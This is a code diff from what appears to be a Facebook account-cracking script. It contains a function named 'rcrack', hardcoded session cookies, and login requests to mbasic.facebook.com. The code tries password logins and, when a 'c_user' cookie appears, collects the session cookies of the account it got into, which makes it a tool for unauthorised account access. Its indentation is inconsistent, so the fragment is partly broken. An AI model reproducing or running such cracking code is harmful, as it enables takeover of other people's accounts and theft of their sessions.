@@ -319,7 +319,15 @@ def rcrack(uid,pwx,tl):
 
 import requests
 
-
+cookies = {
+    'sb': 'AvTmYzvHxvyFW6NqUI1M80ss',
+    'datr': 'AvTmYwk5TZy2cAOdSoFVnU_9',
+    'locale': 'en_US',
+    'vpd': 'v1%3B772x412x1.75',
+    'dpr': '1.75',
+    'wd': '412x772',
+    'fr': '0QEZmxR2vrmUVGYnI.AWVKwjOHZf-WBa7_ErCTkNi0944.Bj5vQC.vU.AAA.0.0.Bj6Eca.AWWzhh_lOt8',
+}
 
 headers = {
     'authority': 'mbasic.facebook.com',
@@ -339,11 +347,12 @@ headers = {
     'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
 }
 
-response = requests.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8
+response = requests.get(
+    'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
     cookies=cookies,
     headers=headers,
 )
-            lo = session.post(  'https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8,data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
